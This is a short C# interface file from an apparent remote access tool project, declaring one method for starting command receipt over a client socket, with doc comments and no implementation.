using System;
using System.Net.Sockets;

namespace RAT.src.Interfaces
{
    /// <summary>
    /// Handles client connection stage over socket.
    /// </summary>
    public interface ISocketConnectionReceiveLogic
    {
        /// <summary>
        /// Wrapper for initial command receive, any command receive starts from here.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        void BeginDataReceive(Socket socket);
    }
}